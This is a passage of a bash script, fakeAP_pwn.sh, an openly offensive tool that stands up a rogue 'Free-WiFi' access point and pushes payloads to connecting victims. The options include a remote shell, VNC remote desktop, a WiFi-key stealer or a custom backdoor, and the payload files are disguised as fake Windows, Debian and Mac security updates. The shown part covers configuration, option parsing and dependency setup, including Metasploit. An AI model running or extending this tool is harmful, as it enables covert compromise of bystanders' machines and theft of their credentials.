#!/bin/bash                                                                                    #
# (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
# fakeAP_pwn.sh v0.3 (Beta-#83 2010-08-06)                                                     #
#---Important----------------------------------------------------------------------------------#
# Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
# The VNC password is "g0tmi1k" (without "")                                                   #
#---ToDo---------------------------------------------------------------------------------------#
# v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
#                           crafted page without affecting any other clients who are browsing  #
#                           Create a captive portal with:                                      #
#                               -CoovaChilli                                                   #
#                               -FreeRadius                                                    #
#                               -MySQL                                                         #
# v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
# v0.5 - Java exploit     - Different "delivery system" ;)                                     #
# v0.6 - Linux/OSX/x64    - Make compatible                                                    #
# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients...             #
# v0.8 - S.E.T.           - Social Engineering Toolkit                                         #
#---Ideas--------------------------------------------------------------------------------------#
# Monitor traffic         - That isn't on port 80 before they download the payload             #
#---Dump Pad-----------------------------------------------------------------------------------#
# Use vnc.rb (in metasploit)                                                                   #
# Not sure if MTU is working correctly                                                         #
# Merge; debug, diagnostics (also improve), verbose.                                           #
# Beep on connected client                                                                     #
# Check for other monitor inferfaces?                                                          #
# Check for update at start?                                                                   #
#---Defaults-----------------------------------------------------------------------------------#
# The interfaces you use (Check with ifconfig!)
interface=eth0
wifiInterface=wlan0
monitorInterface=mon0

# WiFi Name & Channel to use
ESSID="Free-WiFi"
fakeAPchannel=1

# [airbase-ng/hostapd] What software to use for the FakeAP
apType=airbase-ng

# [normal/transparent/non] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
apMode=normal

# [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
payload=wkv
backdoorPath=/root/backdoor.exe

# The directory location to the crafted web page.
www=/var/www/fakeAP_pwn

# If your having "timing out" problems, change this.
mtu=1500

# [true/false] Respond to every WiFi probe request? true = yes, false = no (only for airbase-ng, we can use karma patches for hostapd)
respond2All=false

# [random/set/false] Change the FakeAP MAC Address?
fakeAPmac=set
macAddress=00:05:7c:9a:58:3f

 # [true/false] Runs extra programs after session is created
extras=false

#If you're having problems, creates a output file or displays exactly whats going on. 0=nothing, 1 = info, 2 = inf + commands
debug=false
diagnostics=false
verbose=0

#---Variables----------------------------------------------------------------------------------#
gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
    ourIP="127.0.0.1"                # 10.0.0.1?
     port=$(shuf -i 2000-65000 -n 1) # Random port each time
  version="0.3 (Beta-#83)"
      www="${www%/}"                 # Remove trailing slash
trap 'cleanup interrupt' 2           # Interrupt - "Ctrl + C"

#----Functions---------------------------------------------------------------------------------#
function cleanup() {
   if [ "$1" == "user" ] ; then exit 3 ; fi
   echo
   display action "Cleaning up..." $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo -e "\n-Cleaning up---------------------------------------------------------------------------------" >> fakeAP_pwn.log; fi
   if [ "$1" != "clean" ] ; then
      action "Killing xterm" "killall xterm" $verbose $diagnostics "true" $debug
   fi
   if [ "$debug" != "true" ] || [ "$diagnostics" != "true" ] ; then
      if [ -e /tmp/fakeAP_pwn.rb ] ;       then rm /tmp/fakeAP_pwn.rb;     if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.rb"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.dhcp ] ;     then rm /tmp/fakeAP_pwn.dhcp;   if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.dhcp"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.dns ] ;      then rm /tmp/fakeAP_pwn.dns;    if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.dns"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.wkv ] ;      then rm /tmp/fakeAP_pwn.wkv;    if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.wkv"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.lock ] ;     then rm /tmp/fakeAP_pwn.lock;   if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.lock"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.hostapd ] ;  then rm /tmp/fakeAP_pwn.hostapd;if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.hostapd"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.dsniff ] ;   then rm /tmp/fakeAP_pwn.dsniff; if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.dsniff"; fi ; fi
      if [ -e /tmp/fakeAP_pwn.ssl ] ;      then rm /tmp/fakeAP_pwn.ssl;    if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/fakeAP_pwn.ssl"; fi ; fi
      if [ -e /tmp/hostapd.dump ] ;        then rm /tmp/hostapd.dump;      if [ "$verbose" == "2" ]  ; then echo "Removed: /tmp/hostapd.dump"; fi ; fi
      if [ -e /etc/apache2/sites-available/fakeAP_pwn ]; then # We may want to give apahce running when in "non" mode. - to show a different page!
         action "Restoring apache" "ls /etc/apache2/sites-available/ | xargs a2dissite fakeAP_pwn && a2ensite default* && a2dismod ssl && /etc/init.d/apache2 stop" $verbose $diagnostics "true" $debug
         action "Restoring apache" "rm /etc/apache2/sites-available/fakeAP_pwn" $verbose $diagnostics "true" $debug
      fi
      if [ -e $www/kernal_1.83.90-5+lenny2_i386.deb ] ; then rm $www/kernal_1.83.90-5+lenny2_i386.deb; fi
      if [ -e $www/SecurityUpdate1-83-90-5.dmg.bin ] ;  then rm $www/SecurityUpdate1-83-90-5.dmg.bin; fi
      if [ -e $www/Windows-KB183905-x86-ENU.exe ] ;     then rm $www/Windows-KB183905-x86-ENU.exe; fi
   fi
   if [ "$1" != "clean" ] ; then
      if [ "$apType" == "airbase-ng" ] ; then
         command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
         if [ "$command" == "$monitorInterface" ] ; then
            sleep 3 # Some times it needs to catch up/wait
            action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true" $debug
         fi
      fi
   fi
   if [ "$apMode" == "non" ] ; then # Else will will remove their internet access!
      if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
      iptables --flush        # Remove existing rules - Start fresh
      iptables --delete-chain
      iptables --zero
      echo 0 > /proc/sys/net/ipv4/ip_forward
   fi
   # ubuntu fixes
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]; then mv -f /etc/apparmor.d/usr.sbin.dhcpd3.bkup /etc/apparmor.d/usr.sbin.dhcpd3; fi # Fixes folder persmissions

   echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
   exit 0
}
function help() {
   echo "(C)opyright 2010 g0tmi1k & joker5bb ~ http://g0tmi1k.blogspot.com

 Usage: bash fakeAP_pwn.sh -i [interface] -w [interface] -m [interface] -e [essid] -c [channel]
              -y [airbase-ng/hostapd] -o [normal/transparent/non] -p [sbd/vnc/other] -b [/path]
              -h [/path] -t [MTU] -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]

 Common options:
   -i  ---  Internet Interface (which inferface to use - check with ifconfig)  e.g. eth0
   -w  ---  WiFi Interface (which inferface to use - check with ifconfig)  e.g. wlan0
   -m  ---  Monitor Interface (which inferface to use - check with ifconfig)  e.g. mon0

   -e  ---  WiFi Name e.g. Free-WiFi
   -c  ---  Set the channel for the FakeAP to run on e.g. 6

[*]-y  ---  airbase-ng/hostapd. What software to use for the FakeAP

   -o  ---  Ap Mode. normal/transparent/nontransparent e.g. transparent

   -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
   -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe

   -h  ---  htdocs path e.g. /var/www/fakeAP_pwn
   -t  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
   -r  ---  Respond to every probe request

   -z  ---  Randomizes the MAC Address of the FakeAP
   -a  ---  Use this MAC Address. e.g. 00:05:7c:9a:58:3f

[*]-x  ---  Does a few \"extra\" things after target is infected.
   -d  ---  Debug Mode (Doesn't close any pop up windows)
   -v  ---  Verbose mode (Displays infomation)
   -V  ---  (Higher) Verbose mode (Displays infomation + commands)

   -u  ---  Update fakeAP_pwn

   -?  ---  This screen

 Known issues:
   -\"Odd\" SSID
        > Airbase-ng has a few bugs... Re-run the script.
        > Try hostap
   -Can't connect
        > Airbase-ng has a few bugs... Re-run the script. (Try with -v this time)
        > Try hostap
   -No IP
        > Use latest version of dhcp3-server
   -Slow
        > Don't use a virtual machines
        > Your hardware - 802.11n doesn't work too well!
        > Try hostap
        > Try a different MTU value.
"
   exit 1
}
function update() {
   if [ -e /usr/bin/svn ] ; then
      display action "Checking for update..." $diagnostics
      update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" |cut -c11-)
      if [ "$version" != "0.3 (Beta-#$update)" ] ; then
         display info "Updating..." $diagnostics
         svn export -q --force http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh fakeAP_pwn.sh
         display info "Updated to $update. (=" $diagnostics
      else
         display info "You're using the latest version. (=" $diagnostics
      fi
   else
         display info "Updating..." $diagnostics
         wget -nv -N http://fakeap-pwn.googlecode.com/svn/trunk/fakeAP_pwn.sh
         display info "Updated! (=" $diagnostics
   fi
   echo
   exit 2
}

function testAP() { # testAP essid wiFiinterface
   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error
   eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
   if [ -z "${list[0]}" ]; then
      return 2 # Couldn't detect a single AP
   fi
   for item in "${list[@]}" ; do
      if [ "$item" == "$1" ]; then return 0; fi # Found it!
   done
   return 3 # Couldn't find the fake AP
}

function action() { # action title command verbose diagnostics screen&file debug x y lines
   error="free"
   if [ "$1" == "" ] ||  [ "$2" == "" ] ||  [ "$3" == "" ] ||  [ "$4" == "" ] || [ "$5" == "" ] || [ "$6" == "" ] ; then error="1" ; fi # Coding error
   if [ "$3" != "0" ] && [ "$3" != "1" ] && [ "$3" != "2" ]; then error="3"; fi # Coding error
   if [ "$4" != "true" ] && [ "$4" != "false" ] ; then error="4"; fi # Coding error
   if [ "$5" != "true" ] && [ "$5" != "false" ] ; then error="5"; fi # Coding error
   if [ "$6" != "true" ] && [ "$6" != "false" ] ; then error="6"; fi # Coding error
   if [ "$error" == "free" ] ; then
      xterm="xterm" #Defaults
      command=$2
      x="100"
      y="0"
      lines="15"
      if [ "$6" == "true" ] ; then xterm="$xterm -hold" ; fi
      if [ "$3" == "2" ] ; then echo "Command: $command" ; fi
      if [ "$4" == "true" ] ; then
         echo "$1~Command: $command
---------------------------------------------------------------------------------------------" >> fakeAP_pwn.log
      fi
      if [ "$4" == "true" ] && [ "$5" == "true" ] ; then command="$command | tee -a fakeAP_pwn.log" ; fi
      if [ "$7" != "" ] ; then     x=$7; fi
      if [ "$8" != "" ] ; then     y=$8; fi
      if [ "$9" != "" ] ; then lines=$9; fi
      $xterm -geometry 75x$lines+$x+$y -T "fakeAP_pwn v$version - $1" -e "$command"
      return 0
   else
      display error "Error running command. Error code: $error" $diagnostics
      echo "---------------------------------------------------------------------------------------------
-->ERROR: action $1 , $2 , $3 , $4 , $5 , $6 , $7 , $8 , $9" >> fakeAP_pwn.log;
      return 1
   fi
}

function display(){ # display type message save2file
   error="free"
   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then error="1" ; fi # Coding error
   if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5"; fi # Coding error
   if [ "$error" == "free" ] ; then
      output=""
      if [ "$1" == "action" ] ; then output="\e[01;32m[>]\e[00m" ; fi
      if [ "$1" == "info" ]   ; then output="\e[01;33m[i]\e[00m" ; fi
      if [ "$1" == "diag" ]   ; then output="\e[01;34m[+]\e[00m" ; fi
      if [ "$1" == "error" ]  ; then output="\e[01;31m[-]\e[00m" ; fi
      output="$output $2"
      echo -e "$output"
      if [ "$3" == "true" ] ; then
         if [ "$1" == "action" ] ; then output="[>]" ; fi
         if [ "$1" == "info" ]   ; then output="[i]" ; fi
         if [ "$1" == "diag" ]   ; then output="[+]" ; fi
         if [ "$1" == "error" ]  ; then output="[-]" ; fi
         echo "$output $2" >> fakeAP_pwn.log
      fi
      return 0
   else
      display error "Error displaying. Error code: $error" # Use itsself?
      echo "---------------------------------------------------------------------------------------------
-->ERROR: display $1 , $2 , $3 , $4 " >> fakeAP_pwn.log;
      return 1
   fi
}

#----------------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m fakeAP_pwn v$version"

while getopts "i:w:m:e:c:y:o:p:b:h:t:rz:a:xdDvVu?" OPTIONS; do
  case ${OPTIONS} in
    i     ) export interface=$OPTARG;;
    w     ) export wifiInterface=$OPTARG;;
    m     ) export monitorInterface=$OPTARG;;
    e     ) export ESSID=$OPTARG;;
    c     ) export fakeAPchannel=$OPTARG;;
    y     ) export apType=$OPTARG;;
    o     ) export apMode=$OPTARG;;
    p     ) export payload=$OPTARG;;
    b     ) export backdoorPath=$OPTARG;;
    h     ) export www=$OPTARG;;
    t     ) export mtu=$OPTARG;;
    r     ) export respond2All="true";;
    z     ) export fakeAPmac=$OPTARG;;
    a     ) export macAddress=$OPTARG;;
    x     ) export extras="true";;
    d     ) export debug="true";;
    D     ) export diagnostics="true";;
    v     ) export verbose="1";;
    V     ) export verbose="2";;
    u     ) update;;
    ?     ) help;;
    *     ) display error "Unknown option." $diagnostics;;   # Default
  esac
done

#----------------------------------------------------------------------------------------------#
display action "Checking environment..." $diagnostics

if [ "$(id -u)" != "0" ] ; then display error "Not a superuser." $diagnostics 1>&2; cleanup user; fi

if [ -e /tmp/fakeAP_pwn.wkv ] ; then rm /tmp/fakeAP_pwn.wkv; fi
if [ -e fakeAP_pwn.log ] ;      then rm fakeAP_pwn.log; fi

if [ "$diagnostics" == "true" ] ; then
   echo "fakeAP_pwn v$version
$(date)
---------------------------------------------------------------------------------------------" > fakeAP_pwn.log
fi

if [ "$debug" == "true" ] ; then
   display info "Debug mode" $diagnostics
elif [ "$diagnostics" == "true" ] ; then
   display diag "Diagnostics mode" $diagnostics
fi

if [ "$wifiInterface" == "" ] ; then display error "wifiInterface can't be blank" $diagnostics 1>&2; cleanup; fi
command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
if [ ! $command ]; then
   display error "$wifiInterface isn't a wireless interface." $diagnostics
   display info "Searching for a wireless interface" $diagnostics
   command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
   if [ $command ] ; then
      wifiInterface=$command
      display info "Found $wifiInterface" $diagnostics
   else
      display error "Couldn't find a wireless interface." $diagnostics 1>&2
      cleanup
   fi
fi

if [ "$apMode" != "non" ] ; then
   if [ "$interface" == "" ] ; then display error "interface can't be blank" $diagnostics 1>&2; cleanup; fi
   if [ "$interface" == "$wifiInterface" ] ; then display error "interface and wifiInterface can't be the same!" $diagnostics 1>&2; cleanup; fi
   if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display diag "Testing internet connection" $diagnostics ; fi
   command=$(ping -I $interface -c 1 google.com >/dev/null)
   if ! eval $command ; then
      display error "Internet access test: Failed." $diagnostics
      display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
      apMode="non"
      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access test: Failed." >> fakeAP_pwn.log; fi
   else
      if [ "$diagnostics" == "true" ] ; then echo "--> Internet access test: Okay." >> fakeAP_pwn.log; fi
   fi
   ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
fi

if [ "$apType" == "airbase-ng" ] ; then
   apInterface=at0
else
   apInterface=$wifiInterface
fi

if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
    display info "      interface=$interface
\e[01;33m[i]\e[00m    wifiInterface=$wifiInterface
\e[01;33m[i]\e[00m monitorInterface=$monitorInterface
\e[01;33m[i]\e[00m      apInterface=$apInterface
\e[01;33m[i]\e[00m            ESSID=$ESSID
\e[01;33m[i]\e[00m    fakeAPchannel=$fakeAPchannel
\e[01;33m[i]\e[00m           apType=$apType
\e[01;33m[i]\e[00m           apMode=$apMode
\e[01;33m[i]\e[00m          payload=$payload
\e[01;33m[i]\e[00m     backdoorPath=$backdoorPath
\e[01;33m[i]\e[00m              www=$www
\e[01;33m[i]\e[00m              mtu=$mtu
\e[01;33m[i]\e[00m      respond2All=$respond2All
\e[01;33m[i]\e[00m        fakeAPmac=$fakeAPmac
\e[01;33m[i]\e[00m       macAddress=$macAddress
\e[01;33m[i]\e[00m           extras=$extras
\e[01;33m[i]\e[00m            debug=$debug
\e[01;33m[i]\e[00m      diagnostics=$diagnostics
\e[01;33m[i]\e[00m          verbose=$verbose
\e[01;33m[i]\e[00m        gatewayIP=$gatewayIP
\e[01;33m[i]\e[00m            ourIP=$ourIP
\e[01;33m[i]\e[00m             port=$port"
fi

if [ "$diagnostics" == "true" ] ; then
    echo "-Settings------------------------------------------------------------------------------------
        interface=$interface
    wifiInterface=$wifiInterface
 monitorInterface=$monitorInterface
      apInterface=$apInterface
            ESSID=$ESSID
    fakeAPchannel=$fakeAPchannel
           apType=$apType
           apMode=$apMode
          payload=$payload
     backdoorPath=$backdoorPath
              www=$www
              mtu=$mtu
      respond2All=$respond2All
        fakeAPmac=$fakeAPmac
       macAddress=$macAddress
           extras=$extras
            debug=$debug
      diagnostics=$diagnostics
          verbose=$verbose
        gatewayIP=$gatewayIP
            ourIP=$ourIP
             port=$port
-Environment--------------------------------------------------------------------------------" >> fakeAP_pwn.log
    display diag "Finding kernal version" $diagnostics
    uname -a >> fakeAP_pwn.log
    display diag "Detecting hardware" $diagnostics
    lspci -knn >> fakeAP_pwn.log
    display diag "Testing network" $diagnostics
    ifconfig >> fakeAP_pwn.log
    echo "-----------------------------------------" >> fakeAP_pwn.log
    ifconfig -a >> fakeAP_pwn.log
    if [ "$apMode" != "non" ] ; then
        echo "-Ping------------------------------------" >> fakeAP_pwn.log
        display diag "ping -I $interface -c 4 $ourIP" $diagnostics
        action "Ping" "ping -I $interface -c 4 $ourIP" $verbose $diagnostics "true" $debug
        echo "-----------------------------------------" >> fakeAP_pwn.log
        display diag "ping -I $interface -c 4 $gatewayIP" $diagnostics
        action "Ping" "ping -I $interface -c 4 $gatewayIP" $verbose $diagnostics "true" $debug
        echo "-----------------------------------------" >> fakeAP_pwn.log
        display diag "ping -I $interface -c 4 google.com" $diagnostics
        command=$(ping -I $interface -c 4 google.com >/dev/null >> fakeAP_pwn.log)
        if eval $command; then
           echo "-->Active Internet connection" >> fakeAP_pwn.log
        else
           echo "-->No internet available" >> fakeAP_pwn.log
        fi
    fi
fi

if [ "$ESSID" == "" ] ; then display error "ESSID can't be blank" $diagnostics 1>&2; cleanup; fi
if [ "$fakeAPchannel" == "" ] ; then display error "fakeAPchannel can't be blank" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "" ] ; then display error "monitorInterface isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "" ] && [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then display error "apType isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$payload" == "" ] && [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ] ; then display error "payload isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$apMode" == "" ] && [ "$apMode" != "normal" ] && [ "$apMode" != "transparent" ] && [ "$apMode" != "non" ] ; then display error "apMode isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$apType" == "airbase-ng" ] &&  [ "$respond2All" == "" ] && [ "$respond2All" != "true" ] && [ "$respond2All" != "false" ] ; then display error "respond2All isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$fakeAPmac" == "" ] && [ "$fakeAPmac" != "random" ] && [ "$fakeAPmac" != "set" ] && [ "$fakeAPmac" != "false" ] ; then display error "fakeAPmac isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$macAddress" == "" ] && ! [ $(echo $macAddress | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ] ; then display error "macAddress isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$extras" == "" ] &&  [ "$extras" != "true" ] && [ "$extras" != "false" ] ; then display error "extras isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$debug" == "" ] && [ "$debug" != "true" ] && [ "$debug" != "false" ] ; then display error "debug isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$diagnostics" == "" ] && [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ] ; then display error "debug isn't correct" $diagnostics 1>&2; cleanup; fi
if [ "$verbose" == "" ] && [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ] ; then display error "verbose isn't correct" $diagnostics 1>&2; cleanup; fi

if [ ! -e "$www/index.php" ] ; then
   if [ -d "$www/" ] ; then
      mkdir -p $www
      action "Copying www/" "cp -rf www/* $www/" $verbose $diagnostics "true" $debug
   fi
   if [ ! -e "$www/index.php" ] ; then
      display error "Missing index.php. Did you run: cp -rf www/* $www/" $diagnostics 1>&2
      cleanup
   fi
fi

#Add a repo that has it all?
if [ "$apType" == "airbase-ng" ] ; then
   if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
      display error "aircrack-ng isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         action "Install aircrack-ng" "apt-get -y install aircrack-ng" $verbose $diagnostics "true" $debug
      fi
      if [ ! -e /usr/sbin/airmon-ng ] && [ ! -e /usr/local/sbin/airmon-ng ] ; then
         display error "Failed to install aircrack-ng" $diagnostics 1>&2
         cleanup
      else
         display info "Installed aircrack-ng" $diagnostics
      fi
   fi
elif [ "$apType" == "hostapd" ] ; then
   if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
      display error "hostapd isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         action "Install hostapd" "apt-get -y install hostapd" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "make -C /tmp/libnl-1.1" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "make install -C /tmp/libnl-1.1" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz" $verbose $diagnostics "true" $debug
         #find="#CONFIG_DRIVER_NL80211=y"
         #replace="CONFIG_DRIVER_NL80211=y"
         #sed "s/$replace/$find/g" /tmp/hostapd-0.7.2/hostapd/defconfig > /tmp/hostapd-0.7.2/hostapd/.config
         #action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true" $debug
         #action "Install hostapd" "make install -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true" $debug
      fi
   if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
      display error "Failed to install hostapd." $diagnostics 1>&2
      cleanup
      else
         display info "Installed hostapd." $diagnostics
      fi
   fi
fi
if [ ! -e /usr/bin/macchanger ] ; then
   display error "macchanger isn't installed." $diagnostics
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      action "Install macchanger" "apt-get -y install macchanger" $verbose $diagnostics "true" $debug
   fi
   if [ ! -e /usr/bin/macchanger ] ; then
      display error "Failed to install macchanger" $diagnostics 1>&2
      cleanup
   else
      display info "Installed macchanger" $diagnostics
   fi
fi
if [ ! -e /usr/sbin/dhcpd3 ] ; then
   display error "dhcpd3 isn't installed." $diagnostics
   read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
   if [[ $REPLY =~ ^[Yy]$ ]] ; then
      command=$(apt-get -y install dhcp3-server)
      action "Install dhcpd3" "apt-get -y install dhcp3-server" $verbose $diagnostics "true" $debug
   fi
   if [ -e /usr/sbin/dhcpd3 ] ; then
      display error "Failed to install dhcpd3" $diagnostics 1>&2
      cleanup;
   else
      display info "Installed dhcpd3" $diagnostics
   fi
fi

if [ "$apMode" != "normal" ] ; then
   if [ ! -e /usr/sbin/apache2 ] ; then
      display error "apache2 isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         action "Install apache2 php5" "apt-get -y install apache2 php5" $verbose $diagnostics "true" $debug
      fi
      if [ ! -e /usr/sbin/apache2 ] ; then
         display error "Failed to install apache2" $diagnostics 1>&2
         cleanup
      else
         display info "Installed apache2 & php5" $diagnostics
      fi
   fi
   if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
      display error "Metasploit isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         action "Install metasploit" "apt-get -y install framework3" $verbose $diagnostics "true" $debug
      fi
      if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
         action "Install metasploit" "apt-get -y install metasploit" $verbose $diagnostics "true" $debug
      fi
      if [ ! -e /opt/metasploit3/bin/msfconsole ] ; then
         display error "Failed to install metasploit" $diagnostics 1>&2
         cleanup
      else
         display info "Installed metasploit" $diagnostics
      fi
   fi
   if [ "$payload" == "sbd" ] ; then
      if [ ! -e /usr/local/bin/sbd ] ; then
         display error "sbd isn't installed." $diagnostics
         read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
         if [[ $REPLY =~ ^[Yy]$ ]] ; then
            command=$(apt-get -y install sbd)
         action "Install sbd" "apt-get -y install sbd" $verbose $diagnostics "true" $debug
         fi
         if [ ! -e /usr/local/bin/sbd ] ; then
            display error "Failed to install sbd" $diagnostics 1>&2
            cleanup
         else
            display info "Installed sbd"
         fi
      fi
   elif [ "$payload" == "vnc" ] ; then
      if [ ! -e /usr/bin/vncviewer ] ; then
         display error "vnc isn't installed." $diagnostics
         read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
         if [[ $REPLY =~ ^[Yy]$ ]] ; then
            action "Install vnc" "apt-get -y install vnc" $verbose $diagnostics "true" $debug
         fi
         if [ ! -e /usr/bin/vncviewer ] ; then
            display error "Failed to install vnc" $diagnostics 1>&2
            cleanup
         else
            display info "Installed vnc" $diagnostics
         fi
      fi
   elif [ "$payload" == "wkv" ] ; then
      if [ ! -e "$www/wkv-x86.exe" ] ; then display error "There isn't a wkv-x86.exe at $www/wkv-x86.exe." $diagnostics 1>&2; cleanup; fi
      if [ ! -e "$www/wkv-x64.exe" ] ; then display error "There isn't a wkv-x64.exe at $www/wkv-x64.exe." $diagnostics 1>&2; cleanup; fi
   else
      if [ ! -e "$backdoorPath" ] ; then display error "There isn't a backdoor at $backdoorPath." $diagnostics 1>&2; cleanup; fi
   fi
fi
if [ "$extras" == "true" ] ; then
   if [ ! -e /usr/bin/imsniff ] ; then
      display error "imsniff isn't installed." $diagnostics
      read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
      if [[ $REPLY =~ ^[Yy]$ ]] ; then
         command=$(apt-get -y install imsniff)
         action "Install imsniff" "apt-get -y install imsniff" $verbose $diagnostics "true" $debug
      fi
      if [ ! -e /usr/bin/imsniff ] ; then
         display error "Failed to install imsniff" $diagnostics 1>&2
         cleanup
      else
         display info "Installed imsniff" $diagnostics
      fi
   fi
fi

if [ "$apMode" != "non" ] ; then
   action "Resetting interface" "ifconfig $interface up && sleep 1" $verbose $diagnostics "true" $debug #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
   command=$(ifconfig | grep -q -o "$interface")
   if [ ! $command == "" ] ; then display error "$interface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
   command=$(ifconfig | grep $interface | awk '{print $1}')
   if [ "$command" != "$interface" ] ; then
      display error "The gateway interface $interface, isn't correct." $diagnostics 1>&2
      if [ "$debug" == "true" ] ; then ifconfig; fi
      display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
      apMode="non"
   fi
   if [ -z "$ourIP" ] && [ "$apMode" != "non" ] ; then # not sure if this 100% correct
      action "Acquiring an IP Address" "dhclient $interface" $verbose $diagnostics "true" $debug
      sleep 3
      command=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      if [ -z "$command" ] ; then
         display error "IP Problem. Haven't got an IP address on $interface." $diagnostics 1>&2
         pidcheck=`ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}'`
         if [ -n "$pidcheck" ] ; then
